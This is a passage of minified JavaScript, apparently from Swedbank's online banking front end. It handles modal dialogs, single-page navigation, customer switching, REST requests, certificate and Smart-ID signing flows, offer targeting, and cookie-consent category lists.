buttons?buttons:"confirmDecline"===buttons?{"label-accept":Swedbank.Labels("btnConfirm"),"label-decline":Swedbank.Labels("btnDecline")}:{"label-accept":Swedbank.Labels("yes"),"label-decline":Swedbank.Labels("no")}}},getActive:function(){var modals=document.querySelectorAll("ui-modal.-active");return modals.length>0?modals[modals.length-1]:null},loadContent:function(params){const pageId=params.pageId||Swedbank.Navigation.pageId||"";return 0===["business","private"].indexOf(pageId)&&(params.securityId=""),makeAjaxRequest(document.mainForm,params,(function(response){const json=response.responseJSON;if(json&&json.exception)return void console.error(json.exception);const container=document.createElement("div");container.innerHTML=response.responseText.replace(/name="navForm"/g,'name="__fakeNavForm__"');const queryParamLists=container.querySelectorAll(".query-params-list");Swedbank.Forms.generateDefinitionListClasses(queryParamLists),document.body.appendChild(container),SharedComponents.helpers.rebuildScripts(container).then((()=>{const content=container.querySelector("#content");UI.dispatchCustomEvent(document.body,"modal-open",{type:"page",content:content||container})})).catch((e=>console.error(e))).finally((()=>{container.parentNode==document.body&&document.body.removeChild(container)}))}))},loadPage:function(pageId){Swedbank.UIModals.loadContent({pageId:pageId})},modalResetCallback:()=>{const modalController=document.querySelector("ui-modal-controller");modalController&&[].forEach.call(modalController.getActiveModals(),(modal=>{const cookieConsentElem=modal.closest("ui-cookie-consent");(!cookieConsentElem||cookieConsentElem.hasConsentGiven()||cookieConsentElem.forceHide)&&modal.close()}))}},Swedbank.isUiSpaEnabled?SharedComponents.eventBus.addEventListener("spa-navigation-start",Swedbank.UIModals.modalResetCallback):Swedbank.PageLoad.onEachUnload(Swedbank.UIModals.modalResetCallback),Swedbank.UIProducts={openHandler:function(event){var product=event.target;product.pageId?product.dataset.paramName&&product.dataset.paramValue?navigateTo(product.pageId,product.dataset.paramName,product.dataset.paramValue):navigateTo(product.pageId):product.externalUrl&&window.open(product.externalUrl)}},document.addEventListener("product-open",Swedbank.UIProducts.openHandler);class SinglePageService{constructor(){this.originalActions={navigateTo:window.navigateTo,runLinkAction:window.runLinkAction,doSubmit:window.doSubmit,Navigate:{to:window.Navigate.to}},this.handlePopState=this.handlePopState.bind(this)}static get DEBUG(){return!0}static get XHR_RESPONSE_TYPES(){return{ARRAY_BUFFER:"arraybuffer",DOCUMENT:"document",TEXT:"text",JSON:"json",BLOB:"blob"}}static get NAVIGATION_FUNCS(){return{navigateTo:"navigateTo",linkAction:"linkAction",doSubmit:"doSubmit"}}static get(){return this._instance||(this._instance=new SinglePageService),this._instance}get currentPageId(){return Swedbank.Navigation.pageId}get currentPageUrl(){return Swedbank.Navigation.url}async handlePopState(event){if(SinglePageService.DEBUG&&console.log(event),!event.state&&window.location.href.indexOf("#")>-1)event.preventDefault();else if(null!==history.state&&history.state.pageId){const{pageId:pageId,...params}=history.state;await this.navigateTo(history.state.pageId,params)}else window.location.reload()}getFormParams(form){const fdata=new FormData(form);return fdata.set("navigation_timestamp",(new Date).toString()),fdata}getContentElement(){return document.getElementById("content")}async navigateTo(pageId){const args=[].slice.call(arguments,1);pageId=this._getPageIdFromArgs(args)||pageId,this.isSpaCompatible(pageId)?await this.navigate(pageId,document.navForm,args,SinglePageService.NAVIGATION_FUNCS.navigateTo):SharedComponents.helpers.isPlainObject(arguments[1])?await this.originalActions.Navigate.to(arguments[0],arguments[1],arguments[2]):await this.originalActions.navigateTo(...arguments)}async runLinkAction(form,pageId){const args=[].slice.call(arguments,2);pageId=this._getPageIdFromArgs(args)||pageId,this.isSpaCompatible(pageId)?await this.navigate(pageId,form,args,SinglePageService.NAVIGATION_FUNCS.linkAction):await this.originalActions.runLinkAction(...arguments)}async doSubmit(control,pageId){const args=[].slice.call(arguments,2);let pid=this._getPageIdFromArgs(args)||pageId;this.isSpaCompatible(pageId)?(pid=pageId||this.currentPageId,"string"!==control&&control.getAttribute("name")&&(args[0]=control.getAttribute("name"),args[1]="true"),"string"==typeof control&&(pid=control),await this.navigate(pid,document.mainForm,args,SinglePageService.NAVIGATION_FUNCS.doSubmit)):await this.originalActions.doSubmit(...arguments)}navigate(pageId,form,args,func){if(pageId||(pageId=this.currentPageId),!this.isSpaCompatible(pageId))return Swedbank.SpaService.disable(),null;SinglePageService.DEBUG&&console.log(`SpaService -> ${func} -> ${pageId}, 'from:' ${this.currentPageUrl}`),this.xhr&&(SinglePageService.DEBUG&&console.log("%cXHR aborted()","color: green; background-color: yellow;"),this.xhr.abort()),SharedComponents.eventBus.dispatchCustomEvent("spa-navigation-start",{from:this.currentPageId,to:pageId});let anchor=this._getAnchor(args);anchor&&(form.action+="#"+anchor),this.setIbankFormParams(form,args);let params=this._parseArguments(args);return this.fetchPage(pageId,form,params).then((async fragment=>{SinglePageService.DEBUG&&console.log(fragment);const start=performance.now();this.replaceInHead(fragment,"title,meta"),await this.replaceContent(fragment),this.updateHistoryState(pageId,params,anchor),SinglePageService.DEBUG&&console.log(`SpaService -> ${func} -> ${pageId} -> Success`,`/ Now url is: ${this.currentPageUrl}`),Swedbank.Navigation.referrer=window.location.href,Swedbank.Navigation.lastPageId=Swedbank.Navigation.pageId,this.xhr=null,SinglePageService.DEBUG&&console.log("%cxhr = null (spa completed)","color: green; background-color: yellow;"),SharedComponents.eventBus.dispatchCustomEvent("spa-navigation-complete",{pageId:pageId});const end=performance.now();SinglePageService.DEBUG&&console.log("%cperf: "+(end-start),"color:lightblue;background-color:black")})).catch((err=>{throw SinglePageService.DEBUG&&console.log(`SpaService -> ${func} -> ${pageId} -> Failure`),SharedComponents.eventBus.dispatchCustomEvent("spa-navigation-failed",{pageId:pageId}),console.error(err),err}))}fetchPage(pageId,form,params={}){const requestParams=Object.assign({pageId:pageId},params);return this.makeSpaRequest(requestParams,form)}makeSpaRequest(data,form){return new Promise(((resolve,reject)=>{this.xhr=new XMLHttpRequest;const url=this._convertPageIdToUrl(data.pageId);this.xhr.open("POST",url,!0),this.xhr.setRequestHeader("X-Single-Page-Navigation","true"),this.xhr.responseType=SinglePageService.XHR_RESPONSE_TYPES.ARRAY_BUFFER,this.xhr.onload=res=>{200===this.xhr.status&&this.handleSpaResponse(this.xhr,resolve),[404,503].indexOf(this.xhr.status)>-1&&SharedComponents.eventBus.dispatchCustomEvent("spa-navigation-failed")},this.xhr.onerror=e=>{console.error(e),SharedComponents.eventBus.dispatchCustomEvent("spa-navigation-failed")};const formData=this.getFormParams(form);Object.entries(data).forEach((([key,value])=>formData.set(key,value))),this.xhr.send(formData)}))}handleSpaResponse(xhr,onComplete){0===xhr.getResponseHeader("Content-Type").indexOf("text/html")?this.handlePageLoaded(xhr,onComplete):this.handleFileLoaded(xhr,onComplete)}handlePageLoaded(xhr,onComplete){const blob=new Blob([xhr.response],{type:xhr.getResponseHeader("Content-Type")}),reader=new FileReader;reader.onload=()=>{let template=document.createElement("template");template.innerHTML=reader.result,onComplete(template.content)},reader.readAsText(blob)}handleFileLoaded(xhr,onComplete){let filename=null;const disposition=xhr.getResponseHeader("Content-Disposition");if(disposition&&-1!==disposition.indexOf("attachment")){const matches=/filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(disposition);null!=matches&&matches[1]&&(filename=matches[1].replace(/['"]/g,""))}const blob=new File([xhr.response],filename,{type:xhr.getResponseHeader("Content-Type")}),url=URL.createObjectURL(blob),a=UI.createElement({tagName:"a",attributes:{href:url,download:filename}});document.body.appendChild(a),a.dispatchEvent(new MouseEvent("click")),a.remove()}_parseArguments(args){if(SharedComponents.helpers.isPlainObject(args[0]))return args[0];{const cleanedArgs=[...args].filter((el=>void 0!==el));return SharedComponents.helpers.arrayToObject(cleanedArgs)}}_getAnchor(args){return SharedComponents.helpers.isPlainObject(args[0])&&args[1]?args[1]:args[4]||""}_getPageIdFromArgs(args){let index=args.indexOf("pageId");return index>-1?args[++index]:null}_convertPageIdToUrl(pageId){return pageId?`/${pageId.replace(/\./g,"/")};jsessionid=${Swedbank.Navigation.getSessionId()}`:""}setIbankFormParams(form,args){SharedComponents.helpers.isPlainObject(args[0])?this.createDynamicParameterFields(form,args):(form.field1&&(form.field1.value=args[0]||""),form.value1&&(form.value1.value=args[1]||args[0]),form.field2&&(form.field2.value=args[2]||""),form.value2&&(form.value2.value=args[3]||args[2]))}createDynamicParameterFields(form,params){let idx=0;Object.entries(params[0]).forEach((([name,value],i)=>{++idx;const field=form.querySelector(`[name="field${idx}"]`),val=form.querySelector(`[name="value${idx}"]`);if(field)field.value=name,val.value=value;else{const fieldElem=UI.createElement({tagName:"input",attributes:{type:"hidden",value:String(name),name:"field"+idx}}),valueElem=UI.createElement({tagName:"input",attributes:{type:"hidden",value:String(value),name:"value"+idx}});form.appendChild(fieldElem),form.appendChild(valueElem)}}));for(let i=idx+1;document.navForm[`field${i}`];i++)form[`field${i}`].value="",form[`value${i}`].value=""}replaceInHead(fragment,selector){const newElements=fragment.querySelectorAll(selector);if(SinglePageService.DEBUG&&console.log(newElements),!newElements.length)return;const oldElements=document.head.querySelectorAll(selector);[].forEach.call(oldElements,(node=>document.head.removeChild(node))),[].forEach.call(newElements,(node=>document.head.appendChild(node)))}replaceContent(fragment){const content=this.getContentElement();return content.innerHTML="",content.appendChild(document.importNode(fragment,!0)),SharedComponents.helpers.rebuildScripts(content)}updateHistoryState(pageId,params,anchor){if(this.isComingFromSamePage(pageId))return;let url=this.currentPageUrl;anchor&&(url+="#"+anchor);try{const data=Object.assign({pageId:pageId},params);history.pushState(data,this.currentPageId,url)}catch(e){console.error(e)}}isComingFromSamePage(pageId){return history.state&&history.state.pageId===pageId}isSpaCompatible(pageId){if(!(pageId=pageId||Swedbank.Navigation.pageId)||!Swedbank.Menu)return!1;const parts=pageId.split(".");let node,nodes=[Swedbank.Menu.menuStructure],depth=0,currentPath=parts[depth],isSpa=!1;for(;;){if(node=nodes.filter((n=>n.id===currentPath))[0],!node)return!1;if(isSpa=node.hasOwnProperty("spa")?node.spa:isSpa,node.id===pageId||!node.children||++depth>=parts.length)return isSpa;currentPath+="."+parts[depth],nodes=node.children}}enable(){window.navigateTo=this.navigateTo.bind(this),window.runLinkAction=this.runLinkAction.bind(this),window.doSubmit=this.doSubmit.bind(this),window.Navigate.to=this.navigateTo.bind(this),SharedComponents.eventBus.addEventListener("popstate",this.handlePopState)}disable(){window.navigateTo=this.originalActions.navigateTo,window.runLinkAction=this.originalActions.runLinkAction,window.doSubmit=this.originalActions.doSubmit,window.Navigate.to=this.originalActions.Navigate.to,SharedComponents.eventBus.removeEventListener("popstate",this.handlePopState)}}SinglePageService.DEBUG&&(SharedComponents.eventBus.addEventListener("spa-navigation-start",(e=>{console.log("spa-navigation-start",e.detail)})),SharedComponents.eventBus.addEventListener("spa-navigation-complete",(e=>{console.log("spa-navigation-complete",e.detail)})),SharedComponents.eventBus.addEventListener("spa-navigation-failed",(e=>{console.error("spa-navigation-failed",e.detail)}))),Swedbank.SpaService=SinglePageService.get(),Swedbank.isUiSpaEnabled&&Swedbank.SpaService.enable(),Swedbank.AnnotationService=class{static get restService(){return this._restService||(this._restService=Swedbank.RestService.get()),this._restService}static isRead(id){return Swedbank.log(`Annotation ${id} is not read`),Promise.resolve(false)}static dismiss(id){const params={id:id,pageId:"annotation.api.page"};return Swedbank.log(`Annotation ${id} is dismissed`),Promise.resolve(params)}},SharedComponents.UIAnnotation.defineService(Swedbank.AnnotationService);var Swedbank=Swedbank||{};Swedbank.AccountService=function(){function AccountService(){}return AccountService.get=function(){return this._instance||(this._instance=new AccountService),this._instance},AccountService.prototype.isChatVisible=function(){return document.getElementById("chat")&&document.getElementById("chat").classList.contains("-maximized")},AccountService.prototype.onCloseChat=function(){return Swedbank.UIModals.confirm(Swedbank.Labels("customerChangeWillCloseChat")).then((function(){var endChat=document.getElementById("end-chat");endChat&&endChat.click()}))},AccountService.prototype.isLiveChatVisible=function(){if(void 0===Swedbank.communication)return!1;const chatbox=Swedbank.communication.virtualAssistant.getControl();return chatbox&&chatbox.hasLiveAgent()},AccountService.prototype.onCloseLiveChat=function(customerId,onProceed,onDecline){const chatbox=Swedbank.communication.virtualAssistant.getControl();chatbox?(this.setCustomerControlValue(Swedbank.User.currentCustomerId),SharedComponents.ConfirmationDialogTemplate.create({content:UI.html`
          <h2>${chatbox.getLabel("CHANGE_ACCOUNT_NOTIFICATION")}</h2>
        `,labelAccept:chatbox.getLabel("ACCEPT_ACCOUNT_CHANGE"),labelDecline:chatbox.getLabel("DECLINE_ACCOUNT_CHANGE")}).prompt({onAccept:function(){this.setCustomerControlValue(customerId),chatbox.destroy("AccountChange"),onProceed()}.bind(this),onDecline:onDecline})):onProceed()},AccountService.prototype.setCustomerControlValue=function(customerId){const select=document.getElementById("selectCustomers");if(select){const dropdown=select.closest("ui-dropdown");dropdown&&(dropdown.value=customerId)}},AccountService.prototype.setCustomer=function(customerId,saveDefault){this.isLiveChatVisible()?this.onCloseLiveChat(customerId,function(){this.onChangeCustomer(customerId,saveDefault)}.bind(this)):this.isChatVisible()?this.onCloseChat().then(function(){this.onChangeCustomer(customerId,saveDefault)}.bind(this)):this.onChangeCustomer(customerId,saveDefault)},AccountService.prototype.onChangeCustomer=function(id,saveDefault){Swedbank.User.currentCustomerId=id,Swedbank.AdobeTracking.setIdRefreshNeeded();var form=document.navForm;form.customerChanged.value="true",form.saveDefaultCustomer.value=saveDefault||void 0,form.customer.value=id,form.submit()},AccountService}(),Swedbank.RestService=function(){function RestService(){}return RestService.DEBUG=!1,RestService.get=function(){return this._instance||(this._instance=new RestService),this._instance},RestService.prototype.buildResponseHandler=function(key,onSuccess,onError){return function(result){var content;if(result.hasOwnProperty(key))if("string"==typeof result[key])try{content=JSON.parse(result[key])}catch(e){content=result[key]}else content=result[key];else content=result;if(content){var error=null;content.exception?error={message:content.exception,type:"exception",data:content}:content.error||content.errors?error={message:content.error||("string"==typeof content.errors[0]?content.errors[0]:content.errors[0].message),type:"error",data:content}:"ERROR"===content.state?error={message:content.messages.length?content.messages[0].label:"",type:"error",data:content}:content.techError&&(error={message:content.techError,type:"techError",data:content}),error&&"function"==typeof onError?(RestService.DEBUG&&console.error(error),onError(error)):onSuccess(content)}else onSuccess(content)}},RestService.prototype.buildRequestData=function(action,params){var data={pageId:params&&params.hasOwnProperty("pageId")?params.pageId:this.getPageId()};if(action&&(data[action]="true"),params)for(var key in params)params.hasOwnProperty(key)&&(data[key]=params[key]);return data},RestService.prototype.getSessionId=function(){return Swedbank.Navigation.getSessionId()},RestService.prototype.getAttributesCheckNumber=function(){return Swedbank.commonRequestParams.attributesCheckNumber},RestService.prototype.getSecurityId=function(){return Swedbank.commonRequestParams.securityId},RestService.prototype.getPageId=function(){return null},RestService.prototype.callAction=function(action,params,requestType){return RestService.DEBUG&&console.log("RestService -> callAction  ->",action,"-> request",params),this.performRequest(this.buildRequestData(action,params),requestType).then(function(result){return RestService.DEBUG&&console.log(result),new Promise(function(resolve,reject){this.buildResponseHandler(action,(function(response){RestService.DEBUG&&console.log("RestService -> callAction  ->",action,"-> success",response),resolve(response)}),(function(response){RestService.DEBUG&&console.log("RestService -> callAction  ->",action,"-> error",response),reject(response)}))(result)}.bind(this))}.bind(this))},RestService.prototype.makeJSONRequest=function(data,onSuccess,onError){var additionalData=document.mainForm?window.getSessionParams():Swedbank.commonRequestParams,requestData=Object.assign({},{request_timestamp:(new Date).toString()},additionalData,data),xhr=new XMLHttpRequest,url=[data.hasOwnProperty("url")?data.url:location.pathname.split(";jsessionid=").shift(),this.getSessionId()].join(";jsessionid=");return data.hasOwnProperty("url")||(url=Swedbank.Navigation.url),xhr.addEventListener("load",(function(event){onSuccess(event.target.responseText)})),xhr.addEventListener("error",(function(event){onError(event.target.responseText)})),xhr.open("POST",url),xhr.setRequestHeader("Content-Type","application/json"),xhr.send(JSON.stringify(requestData)),xhr},RestService.prototype.performRequest=function(params,requestType){return new Promise(function(resolve,reject){if("json"===requestType)return this.makeJSONRequest(params,resolve,reject);this.makeAjaxRequestWithRetry(params,resolve,reject,1)}.bind(this))},RestService.prototype.makeAjaxRequestWithRetry=function(data,onSuccess,onError,retryCount){var self=this;retryCount=retryCount||1,RestService.DEBUG&&console.log("RestService -> makeAjaxRequestWithRetry  -> retryCount:",retryCount),makeAjaxRequestWithSuccessCallback(document.mainForm,data).then(onSuccess).catch((function(response){0==response.status?retryCount<5?self.makeAjaxRequestWithRetry(data,onSuccess,onError,retryCount+1):(RestService.DEBUG&&console.log("RestService -> makeAjaxRequestWithRetry  -> Retry count exceeded"),onError(new Error("Retry count exceeded"))):(RestService.DEBUG&&console.log("RestService -> makeAjaxRequestWithRetry  -> error:",response),onError(new Error(response)))}))},RestService}(),Swedbank.CryptoService=Swedbank.CryptoService||class{static get(){return this._instance||(this._instance=new Swedbank.CryptoService),this._instance}getService(){return this.service?Promise.resolve(this.service):this._isWebEidSupported().then((isWebEid=>(this.service=isWebEid?this._webEidPlugin():this._hwcryptoPlugin(),this.service)))}_isWebEidSupported(){return webeid.status().then((response=>function(response){return response&&null!=response.extension&&null!=response.library&&null!=response.nativeApp?(console.log("using web-eid plugin"),Promise.resolve(!0)):Promise.resolve(!1)})).catch((error=>(console.log("web-eid plugin not found, using hwcrypto plugin"),Promise.resolve(!1))))}_webEidPlugin(){let webEidObj=webeid;function _base64ToHex(str){const raw=atob(str);let result="";for(let i=0;i<raw.length;i++){const hex=raw.charCodeAt(i).toString(16);result+=2===hex.length?hex:"0"+hex}return result.toUpperCase()}return{getVersion:function(){return"web-eid"},getCertificate:function(options){return"object"!=typeof options?Promise.reject(new Error(INVALID_ARGUMENT)):(options&&!options.lang&&(options.lang="en"),webEidObj.getSigningCertificate(options).then((function(result){let certificateBase64=result.certificate;return{certificateBase64:certificateBase64,hex:_base64ToHex(certificateBase64)}})))},sign:function(certificate,hash,options){return"object"!=typeof options?Promise.reject(new Error(INVALID_ARGUMENT)):(options&&!options.lang&&(options.lang="en"),hash.type&&(hash.value||hash.hex)?(hash.hex&&!hash.value&&(hash.value=function _hexToBase64(str){return btoa(String.fromCharCode.apply(null,str.replace(/\r|\n/g,"").replace(/([\da-fA-F]{2}) ?/g,"0x$1 ").replace(/ +$/,"").split(" ")))}(hash.hex)),webEidObj.sign(certificate.certificateBase64,hash.value,hash.type,options).then((function(result){return{hex:_base64ToHex(result.signature)}}))):Promise.reject(new Error(INVALID_ARGUMENT)))},getError:function(error){var link=Swedbank.Labels("hwcryptoReadMoreInstructionLink");return error.code===webEidObj.ErrorCode.ERR_WEBEID_USER_CANCELLED?SharedComponents.UISigning.labels.HWCRYPTO_USER_CANCEL:(console.log("Swedbank.CryptoService -> sign -> error:",error),SharedComponents.UISigning.prototype.prepareLabel(SharedComponents.UISigning.labels.HWCRYPTO_DEFAULT_ERROR,link))}}}_hwcryptoPlugin(){let hwcrypto=window.hwcrypto();return{getVersion:function(){return"Hwcrypto"},getCertificate:function(options){return hwcrypto.getCertificate(options)},sign:function(certificate,arg,options){return hwcrypto.sign(certificate,arg,options)},getError:function(error){let errorMessage=error&&error.message?error.message:"";var link=Swedbank.Labels("hwcryptoReadMoreInstructionLink");switch(errorMessage){case"no_certificates":SharedComponents.UISigning.prototype.prepareLabel(SharedComponents.UISigning.labels.HWCRYPTO_NO_CERTIFICATES,link);case"user_cancel":return SharedComponents.UISigning.labels.HWCRYPTO_USER_CANCEL;case"driver_error":SharedComponents.UISigning.prototype.prepareLabel(SharedComponents.UISigning.labels.HWCRYPTO_DRIVER_ERROR,link);case"no_implementation":SharedComponents.UISigning.prototype.prepareLabel(SharedComponents.UISigning.labels.HWCRYPTO_NO_IMPLEMENTATION,link);case"default_error":case"technical_error":case"not_allowed":SharedComponents.UISigning.prototype.prepareLabel(SharedComponents.UISigning.labels.HWCRYPTO_DEFAULT_ERROR,link);default:return errorMessage}}}}},Swedbank.SigningService=function(){function SigningService(restService,cryptoService){this.rest=restService,this.cryptoService=cryptoService}return SigningService.get=function(){return this._instance||(this._instance=new SigningService(Swedbank.RestService.get(),Swedbank.CryptoService.get())),this._instance},SigningService.LANG="ENG",SigningService.DEBUG=!1,SigningService.METHODS={CERTIFICATE:"CERTIFICATE",MOBILE_ID:"MOBILE_ID",DIGIPASS:"DIGIPASS",PIN_CALCULATOR:"PIN_CALCULATOR",ADVANCED_PIN_CALCULATOR:"ADVANCED_PIN_CALCULATOR",SMART_ID:"SMART_ID",SMART_ID_NQ:"SMART_ID_NQ",SMART_ID_Q:"SMART_ID_Q",SIMPLE_ID:"SIMPLE_ID",EPARAKSTS_MOBILE:"EPARAKSTS_MOBILE"},SigningService.prototype.isDigipass=function(method){return[SigningService.METHODS.DIGIPASS,SigningService.METHODS.PIN_CALCULATOR,SigningService.METHODS.ADVANCED_PIN_CALCULATOR].indexOf(String(method).toUpperCase())>-1},SigningService.prototype.isSmartId=function(method){return[SigningService.METHODS.SMART_ID,SigningService.METHODS.SMART_ID_Q,SigningService.METHODS.SMART_ID_NQ].indexOf(String(method).toUpperCase())>-1},SigningService.prototype.isMobileId=function(method){return method===SigningService.METHODS.MOBILE_ID},SigningService.prototype.isSimpleId=function(method){return method===SigningService.METHODS.SIMPLE_ID},SigningService.prototype.isCertificate=function(method){return method===SigningService.METHODS.CERTIFICATE},SigningService.prototype.cancel=function(){this.canceled=!0,this.actualRequestId=null,clearTimeout(this.pollTimeout),this.setPolSessionCode("")},SigningService.prototype.runSingingProcess=function(onInit,onProceed,onComplete,onError,customParams){this.getSigningMethod().then(function(signingMethod){onInit({signingMethod:signingMethod,title:null,status:null}),this.sign(signingMethod,onProceed,onComplete,onError,customParams)}.bind(this),onError)},SigningService.prototype.sign=function(signingMethod,onInit,onComplete,onError,customParams){if(!this.signingInProgress)if(this.signingInProgress=!0,this.canceled=!1,signingMethod.confirmationRequired)if(this.isDigipass(signingMethod.method))this.rest.callAction("initiate",Object.assign({},customParams)).then((function(result){onInit({method:signingMethod.method,id:result.challengeID,title:null,status:null})})).catch((function(response){onError(response)}));else if(this.isCertificate(signingMethod.method))this.signWithCert({lang:this.getLanguage()},customParams,onComplete,onError);else{var actualRequestId=performance.now();this.actualRequestId=actualRequestId,this.initPolling(this.buildPollingHandler(signingMethod.method,onInit,onComplete,onError,customParams,actualRequestId))}else this.rest.callAction("initiate",customParams).then(onComplete,onError)},SigningService.prototype.buildSuccessHandler=function(method,nextCall,onInit,onComplete,onBusinessError,onUserError){var attempt=0;return function(result){if(!this.canceled)switch(attempt++,result.status){case"wait":this.setPolSessionCode("1"),onInit({status:result.statusLabel,id:result.challengeID,method:method,sessionCode:"1"}),this.pollTimeout=setTimeout(nextCall,1===attempt?this.getFirstPollTimeout(method):this.getRegularPollTimeout(method));break;case"done":this.setPolSessionCode("1"),onComplete(result);break;case"businessError":onBusinessError(result);break;default:onUserError(result)}}.bind(this)},SigningService.prototype.buildUserErrorHandler=function(callback){return function(){SigningService.DEBUG&&console.log("SigningService -> onUserError",arguments),"function"==typeof callback&&callback.apply(null,arguments)}},SigningService.prototype.buildTechnicalErrorHandler=function(callback){return function(){SigningService.DEBUG&&console.log("SigningService -> onTechnicalError",arguments),"function"==typeof callback&&callback.apply(null,arguments)}},SigningService.prototype.buildBusinessErrorHandler=function(callback){return function(){SigningService.DEBUG&&console.log("SigningService -> onBusinessError",arguments),"function"==typeof callback&&callback.apply(null,arguments)}},SigningService.prototype.buildPollingHandler=function(method,onInit,onComplete,onError,customParams,actualRequestId){var progressHandler=function(){SigningService.DEBUG&&console.log("SigningService -> NextCall"),actualRequestId===this.actualRequestId?this.doPoll(this.buildSuccessHandler(method,progressHandler,onInit,onComplete,this.buildBusinessErrorHandler(onError),this.buildUserErrorHandler(onError)),this.buildTechnicalErrorHandler(onError),this.buildBusinessErrorHandler(onError),customParams):this.canceled&&onComplete({canceled:!0})}.bind(this);return progressHandler},SigningService.prototype.signWithCert=function(options,customParams,onComplete,onError){var cryptoService=Swedbank.CryptoService.get(),restService=this.rest,signingService=this;globalSigningId=performance.now();var localSigningId=globalSigningId;return cryptoService.getService().then((cryptoService=>cryptoService.getCertificate(options))).then((function(certificate){return restService.callAction("initiate",Object.assign({"signForm.certValue":certificate.hex},customParams)).then((function(result){return globalSigningId!==localSigningId?(console.warn("Breaking signing flow due to signingId inconsistency"),{then:function(){}}):cryptoService.getService().then((cryptoService=>cryptoService.sign(certificate,{hex:result.hash,type:result.hashType||"SHA-256"},options)))}))})).then((function(signRes){return restService.callAction("confirmCode",{signingCode:signRes.hex}).then((function(result){if("wait"===result.status){signingService.getSigningMethod().then((function(signingMethod){var actualRequestId=performance.now();signingService.actualRequestId=actualRequestId,signingService.setPolSessionCode("1"),signingService.buildPollingHandler(signingMethod.method,(()=>{}),onComplete,onError,{},actualRequestId).call()}))}else"function"==typeof onError&&onError.apply(null,[result.statusLabel])}))})).catch((function(error){onError(error)}))},SigningService.prototype.confirmCode=function(params){return this.rest.callAction("confirmCode",params)},SigningService.prototype.setPolSessionCode=function(code){this.pollSessCode=code},SigningService.prototype.initPolling=function(pollFunction){this.setPolSessionCode(""),pollFunction()},SigningService.prototype.doPoll=function(onSuccess,onTechnicalError,onBusinessError,customParams){var params={pollDate:(new Date).getTime(),pollSessCode:this.pollSessCode||"",raw:!1};return params=Object.assign(params,customParams),this.rest.callAction(this.pollSessCode?"poll":"initiate",params).then((function(result){onSuccess(result)}),(function(error){error instanceof Error?onTechnicalError(error):onBusinessError(error)}))},SigningService.prototype.getSigningMethod=function(){return this.rest.callAction("signingMethod",{})},SigningService.prototype.getLanguage=function(){switch(SigningService.LANG){case"EST":return"et";case"LAT":return"lv";case"LIT":return"lt";case"RUS":return"ru";default:return"en"}},SigningService.prototype.getFirstPollTimeout=function(method){return"true"===Swedbank.sessionStorage.get("UI_TEST")?0:this.isMobileId(method)?5e3:2e3},SigningService.prototype.getRegularPollTimeout=function(method){return"true"===Swedbank.sessionStorage.get("UI_TEST")?1:this.isMobileId(method)?2e3:1e3},SigningService}(),Swedbank.UIOffers={closeHandler:function(event){const offerElement=event.target;event.defaultPrevented||(Swedbank.UIOffers.sendStatus(event.detail.id,event.detail.status,Swedbank.Navigation.pageId),offerElement.classList.add("-hidden"))},sendStatus:function(bankOfferUniqueId,status,cbOrPageId,comment){Swedbank.Offers.sendStatus(bankOfferUniqueId,status,cbOrPageId,comment)},contentHelper:function(customer){const offers=document.querySelectorAll('ui-offer[data-helper="true"]'),segment=customer.customerSegment,age=customer.customerAge;offers&&offers.length&&offers.forEach((function(offer){const targetSegment=offer.dataset.csp,targetAge=offer.dataset.age,segmentContent=offer.querySelectorAll("[data-csp]"),ageContent=offer.querySelectorAll("[data-age]"),nonTargetContent=offer.querySelectorAll('[data-default="true"]');targetSegment?Swedbank.UIOffers.segmentCheck(offer,targetSegment,segment):targetAge?Swedbank.UIOffers.ageCheck(offer,targetAge,age):segmentContent&&segmentContent.length&&Swedbank.UIOffers.validSegment(segmentContent,segment)?segmentContent.forEach((function(content){Swedbank.UIOffers.segmentCheck(content,content.dataset.csp,segment)})):ageContent&&ageContent.length&&Swedbank.UIOffers.validAge(ageContent,age)?ageContent.forEach((function(content){Swedbank.UIOffers.ageCheck(content,content.dataset.age,age)})):nonTargetContent&&nonTargetContent.length&&nonTargetContent.forEach((function(content){content.classList.remove("-hidden")}))}))},segmentCheck:function(element,targetSegment,segment){targetSegment===segment?element.classList.contains("-hidden")&&element.classList.remove("-hidden"):element.classList.add("-hidden")},validSegment:function(contents,segment){let valid=!1;return contents.forEach((function(content){content.dataset.csp===segment&&(valid=!0)})),valid},ageCheck:function(element,targetAge,age){const startAge=parseInt(targetAge.split("-")[0]),endAge=parseInt(targetAge.split("-")[1]);age>=startAge&&age<=endAge?element.classList.contains("-hidden")&&element.classList.remove("-hidden"):element.classList.add("-hidden")},validAge:function(contents,age){let valid=!1;return contents.forEach((function(content){const startAge=parseInt(content.dataset.age.split("-")[0]),endAge=parseInt(content.dataset.age.split("-")[1]);age>=startAge&&age<=endAge&&(valid=!0)})),valid},consentCheck:function(){document.querySelectorAll("ui-offer[data-consent]").forEach((offer=>{const restService=Swedbank.RestService.get(),params={isConsentAllowedAjax:!0,consentCode:offer.dataset.consent,pageId:"private.home.important.gdpr2"};restService.performRequest(params).then((response=>{if(response){if(!response.consentAllowed){const parent=offer.parentElement;offer.remove(),parent.children.length||""!==parent.textContent.trim()||parent.hide()}}}))}))}},document.addEventListener("offer-close",Swedbank.UIOffers.closeHandler),Swedbank[Symbol("cookies")]={NECESSARY:["COOKIE_CONSENT","leavePopup","simpleLogin","loginWidget","hanza","general","advanced","smartLogin","lastApp","JSESSIONID","hanzaLoginTab","securityId","language","LS_JSESSIONID_","ONBOARDING_JSESSIONID","TS01"],ANALYTICAL:["s_cc","s_sq","s_vi","s_fid","s_ecid","AMCV","SSID","SSSC","SSRT","SSPV","SSOD","SSLB","__ssp__history__session","__ssa__data","_cls_s","_cls_v","eventbucket","gb.sid","db.botDetection","gb.lastReferrer","gb.cors_ready","gb.record.bychange.enabled","gb.record.bychange.prev_th","gb.domrecord.bychange.enabled","gb.domrecord.bychange.prev_th","gb_unbound.app.conf","gb_unbound.res.pending","gb_unbound.res.all","gb_unbound.cls_v_expr","gb.psn","gb.btabid"],TARGETING:["scp","scpa","businessDirectMarketingChannelsPopup","hidePublicFeedbackWidget"]},Swedbank[Symbol("storage")]={NECESSARY:["fromBusinessLoanPage","win-scroll-offset","openChatInContactsPage","Esamount","Esgoal","plmenu","p2pNewAgreement","p2pCompanySwitching","application-leaving-reason","countriesCodesStorageEST","countriesCodesStorageLAT","countriesCodesStorageLIT","countriesCodesStorageENG","countriesCodesStorageRUS","all-assets-opened","ui-spa-debug"],ANALYTICAL:["mcrvalue"],TARGETING:["abandonedid","abandonedcard","pinLogsB","pinLogsP","loungekeyinfo","ltYouthUser"]},SharedComponents.UICookieConsent.warn=Swedbank.warn,S